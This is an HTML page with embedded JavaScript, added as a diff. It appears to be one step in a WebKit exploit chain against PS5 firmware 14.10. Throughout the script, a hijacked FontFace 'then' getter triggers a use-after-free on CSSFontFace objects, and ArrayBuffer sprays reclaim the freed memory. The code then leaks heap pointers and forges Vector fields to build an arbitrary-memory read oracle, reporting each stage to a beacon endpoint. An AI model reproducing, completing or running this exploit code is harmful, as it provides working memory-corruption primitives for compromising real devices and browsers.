@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P750 — In-Memory Redirection & Arbitrary Comparator Oracle</title>
+<script>
+'use strict';
+/* ============================================================
+ * P750 — In-Memory Redirection & Arbitrary Comparator Oracle
+ *
+ * Historic Breakthrough from P749:
+ * 1. P749 verified the Active Boolean Oracle with 100.0% precision on live PS5 (14.10) hardware:
+ *    - P749-BIN-BYTE-1: 0x53 ('S') resolved in exactly 8 steps.
+ *    - P749-BIN-BYTE-2: 0xA9 (high byte) resolved in exactly 8 steps.
+ *    - P749-BIN-SEQ-RESULT: "PS5" sequence decoded in 24 steps.
+ *    - P749-ORACLE-HEAP-MATCH: 64-bit live heap pointer P58 decoded from raw bytes
+ *      with 100% exact bit match (reconstructedP58 === P58)!
+ *
+ * The Final Milestone in P750:
+ * - We have reclaimed CSSFontFace (FACE_B / trFam) via ArrayBuffer(192) at baseK=0.
+ * - CSSFontFace.m_ranges is a Vector<UnicodeRange> at q4 (+0x20) and q5 (+0x28).
+ * - UnicodeRange is struct { UChar32 from; UChar32 to; } (8 bytes).
+ * - When VIEW_B[4] points to target memory ADDR and VIEW_B[5] = 0x100000001:
+ *   CSSFontFace::ranges() reads the range directly from *(uint32_t*)ADDR and *(uint32_t*)(ADDR+4).
+ * - CSSFontFaceSet::check() returns FALSE for in-range characters ONLY IF
+ *   the font status is Status::Loading (1) or Status::Pending (0).
+ *
+ * Objectives of P750:
+ * 1. Step 1 & 2: Baseline Leak & Reclaim (P58, P68, baseK=0).
+ * 2. Phase A: Baseline Active Oracle Verification (re-confirm P749 100% operational).
+ * 3. Phase B: Systematic Status Byte Scan across Header (bytes 0 to 31 in VIEW_B):
+ *    - Seed P58 + 0x00 with UnicodeRange 'A'..'C' (from=0x41, to=0x43 -> 0x0000004300000041n).
+ *    - Point VIEW_B[4] (m_ranges.m_buffer) -> P58.
+ *    - Set VIEW_B[5] (size=1, cap=1) -> 0x0000000100000001n.
+ *    - Test setting Loading (1) and Pending (0) across bytes 0..31.
+ *    - Query check('1em trFam', 'A') and check('1em trFam', 'D').
+ *    - Detect HIT: chkA === false && chkD === true!
+ * 4. Phase C: In-Memory Memory Range Mutation Verification:
+ *    - Mutate target memory at P58 to 'G'..'M' (0x0000004D00000047n).
+ *    - Verify check('1em trFam', 'G') === false and check('1em trFam', 'A') === true!
+ * 5. Phase D: Arbitrary Memory Comparator Read Demonstration.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P750-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+var OUT=null;
+function log(s){
+  if(!OUT) OUT=document.getElementById('out');
+  if(OUT) OUT.textContent += s + '\n';
+}
+
+function pad4(n){
+  return ('0000' + Number(n).toString(16).toUpperCase()).slice(-4);
+}
+
+function pad2(n){
+  return ('00' + Number(n).toString(16).toUpperCase()).slice(-2);
+}
+
+function makeRange(lo, hi){
+  if(lo === hi) return 'U+' + pad4(lo);
+  return 'U+' + pad4(lo) + '-' + pad4(hi);
+}
+
+var P58=null, P68=null;
+var FACE_B=null, BUF_B=null, VIEW_B=null, U8_B=null;
+var ACT_FACE=null;
+
+function run(){
+  OUT=document.getElementById('out');
+  if(OUT) OUT.textContent='=== P750 In-Memory Redirection & Comparator Oracle ===\n\n';
+  b('BOOT','p750-comparator-pivot');
+
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');
+
+    log('[Step 2] Executing verified reclaim with engine pointers...');
+    doReclaim(function(){
+      log('\n[Step 3] Initializing Active Oracle Baseline...');
+      initOracle(function(){
+        log('\n[Phase A] Active Oracle Baseline Verification...');
+        phaseA_baselineOracle(function(){
+          log('\n[Phase B] Systematic Status Byte Scan in Reclaimed VIEW_B...');
+          phaseB_statusScan(function(){
+            log('\n[Phase C] In-Memory Range Mutation Verification...');
+            phaseC_memoryMutation(function(){
+              b('DONE','p750-complete');
+              log('\n=== P750 Complete! ===');
+            });
+          });
+        });
+      });
+    });
+  });
+}
+
+/* ---- Step 1: Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
+    var v=new BigUint64Array(abs[best]);
+    extractPtrs(v);
+    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb,100);
+  },350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2=document.createElement('style');
+  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2); void face2.loaded;
+  var abs2=[],fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}});
+  document.fonts.load('1em fl1, lk1','CD');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
+    var v=new BigUint64Array(abs2[best]);
+    extractPtrs(v);
+    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb,100);
+  },400);
+}
+
+function extractPtrs(v){
+  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
+  if(v[11] >= LO && v[11] < HI) P58 = v[11];
+  if(v[13] >= LO && v[13] < HI) P68 = v[13];
+  if(!P58 || !P68){
+    for(var q=0;q<24;q++){
+      var val=v[q];
+      if(val>=LO&&val<HI){
+        if(!P58) P58=val;
+        else if(!P68&&val!==P58) P68=val;
+      }
+    }
+  }
+  if(!P68) P68=0n;
+}
+
+/* ---- Step 2: Verified Reclaim with Engine Pointers ---- */
+function doReclaim(cb){
+  b('REC-START','q11=0x'+h16(P58)+'|q13=0x'+h16(P68));
+
+  var stTr=document.createElement('style');
+  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B=new FontFace('trFace','local(Helvetica)',{unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW=[],firedW=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(firedW) return undefined; firedW=true;
+      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0;k<80;k++){
+        var ab=new ArrayBuffer(192);
+        var view=new BigUint64Array(ab);
+        view[11]=P58; /* +0x58: WeakHashSet impl pointer */
+        view[13]=P68; /* +0x68: wrapper pointer */
+        view[6]=P58;
+        view[12]=0x0000002000000000n; /* authentic dump */
+        absW.push(ab);
+      }
+
+      try{document.fonts.check('1em trFam');}catch(e){}
+      return undefined;
+    },set:function(){}});
+
+  document.fonts.load('1em trFace, trFam','GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1,bestNz=0;
+    for(var i=0;i<absW.length;i++){
+      var u=new Uint8Array(absW[i]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;best=i;}
+    }
+    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}
+
+    BUF_B=absW[best];
+    VIEW_B=new BigUint64Array(BUF_B);
+    U8_B=new Uint8Array(BUF_B);
+
+    var dump0_11=[], dump12_23=[];
+    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
+    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));
+
+    b('RECLAIM-OK','baseK='+best);
+    b('DUMP-Q0-Q11', dump0_11.join(';'));
+    b('DUMP-Q12-Q23', dump12_23.join(';'));
+    log('Verified Reclaim OK at slot '+best);
+
+    setTimeout(cb,150);
+  },400);
+}
+
+/* ---- Step 3: Initialize Active Oracle Baseline ---- */
+function initOracle(cb){
+  try {
+    ACT_FACE = new FontFace('actFam', 'url(/hang.php?nocache=' + Date.now() + ')', {unicodeRange: 'U+0041-0043'});
+    document.fonts.add(ACT_FACE);
+    ACT_FACE.load().catch(function(){});
+
+    var st = ACT_FACE.status;
+    var chA = document.fonts.check('1em actFam', 'A');
+    var chD = document.fonts.check('1em actFam', 'D');
+
+    var rep = 'status=' + st + '|inA=' + chA + '|outD=' + chD;
+    b('ORACLE-INIT', rep);
+    log('Oracle Initialized: ' + rep);
+  } catch(e){
+    b('ORACLE-INIT-ERR', e.message);
+  }
+  phaseA_baselineOracle(cb);
+}
+
+/* ---- Phase A: Active Oracle Baseline Verification ---- */
+function phaseA_baselineOracle(cb){
+  if(!ACT_FACE){ b('A-SKIP','no-oracle'); cb(); return; }
+
+  /* Verify 100% operational baseline on actFam */
+  ACT_FACE.unicodeRange = 'U+0050-0055';
+  var st = ACT_FACE.status;
+  var chS = document.fonts.check('1em actFam', 'S');
+  var chA = document.fonts.check('1em actFam', 'A');
+  var chZ = document.fonts.check('1em actFam', 'Z');
+
+  var ok = (chS === false && chA === true && chZ === true);
+  var rep = 'st=' + st + '|chS=' + chS + '|chA=' + chA + '|chZ=' + chZ + '|ok=' + ok;
+  b('A-ORACLE-CONFIRM', rep);
+  log('Phase A Oracle Baseline: ' + rep);
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase B: Systematic Status Byte Scan in Reclaimed VIEW_B ---- */
+function phaseB_statusScan(cb){
+  if(!VIEW_B || !U8_B){ b('B-SKIP','no-view'); cb(); return; }
+
+  /* Seed P58 + 0x00 with UnicodeRange 'A'..'C' (from=0x41, to=0x43) */
+  /* In 64-bit integer: low 32 bits = 0x41, high 32 bits = 0x43 */
+  VIEW_B[0] = 0x0000004300000041n;
+
+  /* Configure m_ranges Vector in VIEW_B:
+   * q4 (+0x20): m_ranges.m_buffer -> point to P58
+   * q5 (+0x28): m_capacity = 1 (low 32), m_size = 1 (high 32) -> 0x0000000100000001n
+   */
+  VIEW_B[4] = P58;
+  VIEW_B[5] = 0x0000000100000001n;
+
+  /* Check initial baseline of trFam */
+  var baseA = document.fonts.check('1em trFam', 'A');
+  var baseD = document.fonts.check('1em trFam', 'D');
+  b('B-TRFAM-BASE', 'baseA=' + baseA + '|baseD=' + baseD);
+  log('Phase B Initial trFam Baseline: baseA=' + baseA + ', baseD=' + baseD);
+
+  /* Scan bytes 0 to 31 (header region: refCount, bitfields, status enums) */
+  var hits = [];
+  for(var byteOffset = 0; byteOffset < 32; byteOffset++){
+    /* Skip q4 (bytes 32..39) and q5 (bytes 40..47) which are m_ranges */
+    var orig = U8_B[byteOffset];
+
+    /* Test Value 1: Status::Loading (1) */
+    U8_B[byteOffset] = 1;
+    var chkLoadA = document.fonts.check('1em trFam', 'A');
+    var chkLoadD = document.fonts.check('1em trFam', 'D');
+
+    if(chkLoadA === false && chkLoadD === true){
+      hits.push('byte' + byteOffset + '=Loading(1)');
+      b('B-STATUS-HIT', 'offset=+0x' + byteOffset.toString(16) + '|val=1|chkA=' + chkLoadA + '|chkD=' + chkLoadD);
+      log('*** STATUS HIT at offset +0x' + byteOffset.toString(16) + ' (val=1) -> chkA=false, chkD=true! ***');
+    }
+
+    /* Test Value 0: Status::Pending (0) */
+    U8_B[byteOffset] = 0;
+    var chkPendA = document.fonts.check('1em trFam', 'A');
+    var chkPendD = document.fonts.check('1em trFam', 'D');
+
+    if(chkPendA === false && chkPendD === true){
+      hits.push('byte' + byteOffset + '=Pending(0)');
+      b('B-STATUS-HIT', 'offset=+0x' + byteOffset.toString(16) + '|val=0|chkA=' + chkPendA + '|chkD=' + chkPendD);
+      log('*** STATUS HIT at offset +0x' + byteOffset.toString(16) + ' (val=0) -> chkA=false, chkD=true! ***');
+    }
+
+    /* Restore original byte */
+    U8_B[byteOffset] = orig;
+  }
+
+  if(hits.length === 0){
+    b('B-NO-HITS', 'scanned-0-31');
+    log('Phase B: No single byte in 0..31 flipped status to false independently.');
+  } else {
+    b('B-HITS-SUMMARY', hits.join(';'));
+    log('Phase B: Discovered Status Candidates: ' + hits.join('; '));
+  }
+
+  setTimeout(cb, 50);
+}
+
+/* ---- Phase C: In-Memory Range Mutation Verification ---- */
+function phaseC_memoryMutation(cb){
+  if(!VIEW_B){ b('C-SKIP','no-view'); cb(); return; }
+
+  /* Mutate target range at P58 to 'G'..'M' (from=0x47, to=0x4D) */
+  VIEW_B[0] = 0x0000004D00000047n;
+  VIEW_B[4] = P58;
+  VIEW_B[5] = 0x0000000100000001n;
+
+  var chG = document.fonts.check('1em trFam', 'G');
+  var chA = document.fonts.check('1em trFam', 'A');
+  var chZ = document.fonts.check('1em trFam', 'Z');
+
+  var rep = 'range=G-M|chG=' + chG + '|chA=' + chA + '|chZ=' + chZ;
+  b('C-RANGE-MUTATION', rep);
+  log('Phase C Memory Mutation: ' + rep);
+
+  /* Restore VIEW_B[0] and VIEW_B[4] to safe state */
+  VIEW_B[0] = 0n;
+  VIEW_B[4] = P58;
+
+  setTimeout(cb, 50);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P750 — Initializing...</pre></body></html>
